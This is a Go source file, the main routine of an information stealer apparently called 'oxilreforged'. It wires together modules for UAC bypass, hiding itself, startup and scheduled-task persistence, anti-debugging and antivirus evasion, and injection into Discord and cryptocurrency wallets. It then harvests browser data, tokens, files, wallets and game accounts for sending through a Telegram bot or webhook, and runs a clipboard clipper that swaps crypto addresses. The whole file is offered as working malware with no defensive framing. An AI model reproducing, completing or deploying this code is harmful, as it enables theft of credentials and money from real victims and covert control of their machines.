package main

import (
	"github.com/oxil-staeler/oxilreforged/modules/adminpersistence"
	"github.com/oxil-staeler/oxilreforged/modules/antidebug"
	"github.com/oxil-staeler/oxilreforged/modules/antivirus"
	"github.com/oxil-staeler/oxilreforged/modules/browsers"
	"github.com/oxil-staeler/oxilreforged/modules/clipper"
	"github.com/oxil-staeler/oxilreforged/modules/commonfiles"
	"github.com/oxil-staeler/oxilreforged/modules/discodes"
	"github.com/oxil-staeler/oxilreforged/modules/discordinjection"
	"github.com/oxil-staeler/oxilreforged/modules/games"
	"github.com/oxil-staeler/oxilreforged/modules/hideconsole"
	"github.com/oxil-staeler/oxilreforged/modules/startup"
	"github.com/oxil-staeler/oxilreforged/modules/system"
	"github.com/oxil-staeler/oxilreforged/modules/taskpersistence"
	"github.com/oxil-staeler/oxilreforged/modules/tokens"
	"github.com/oxil-staeler/oxilreforged/modules/uacbypass"
	"github.com/oxil-staeler/oxilreforged/modules/wallets"
	"github.com/oxil-staeler/oxilreforged/modules/walletsinjection"
	"github.com/oxil-staeler/oxilreforged/modules/telegram"

	"github.com/oxil-staeler/oxilreforged/utils/program"
	"github.com/oxil-staeler/oxilreforged/utils/fileutil"
	"github.com/oxil-staeler/oxilreforged/utils/hardware"
	"github.com/oxil-staeler/oxilreforged/utils/requests"
)

var adminPersistenceFunc = adminpersistence.Run
var taskPersistenceFunc = taskpersistence.Run

func main() {
	CONFIG := map[string]interface{}{
		"webhook": "",
		"telegram_bot_token": " ",
		"telegram_chat_id":   " ",
		"cryptos": map[string]string{
			"BTC": "", "BCH": "", "ETH": "", "XMR": "", "LTC": "",
			"XCH": "", "XLM": "", "TRX": "", "ADA": "", "DASH": "", "DOGE": "",
		},
	}

	if program.IsAlreadyRunning() {
		return
	}

	uacbypass.Run()
	hideconsole.Run()
	program.HideSelf()

	if !program.IsInStartupPath() {
		go startup.Run()
	}

	go antidebug.Run()
	go antivirus.Run()

	go discordinjection.Run("", "")
	go walletsinjection.Run("", "", "")

	botToken := CONFIG["telegram_bot_token"].(string)
	chatID := CONFIG["telegram_chat_id"].(string)

	actions := []func(string, string){
		system.Run, browsers.Run, tokens.Run, discodes.Run,
		commonfiles.Run, wallets.Run, games.Run,
	}

	for _, action := range actions {
		go action(botToken, chatID)
	}

	clipper.Run(CONFIG["cryptos"].(map[string]string))
}

